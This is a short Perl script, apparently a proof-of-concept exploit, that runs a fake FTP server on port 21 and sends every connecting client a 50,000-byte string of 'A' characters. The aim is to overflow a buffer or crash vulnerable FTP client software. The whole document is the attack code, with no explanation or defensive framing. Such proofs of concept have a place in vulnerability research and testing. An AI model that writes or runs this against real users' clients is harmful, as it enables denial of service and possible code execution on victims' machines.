#!/usr/bin/perl
use IO::Socket;
$host = "localhost";
$port = "21";
$server = IO::Socket::INET->new(LocalPort => $port, Type =>
SOCK_STREAM,
Reuse => 1, Listen => 2) or die "Couldn't create tcp-server.\n";
$data = "A";
$num = "50000";
$buf .= $data x $num;
while ($client = $server->accept()) {
 print "OK";
 print $client "$buf\n";
 close($client);
}

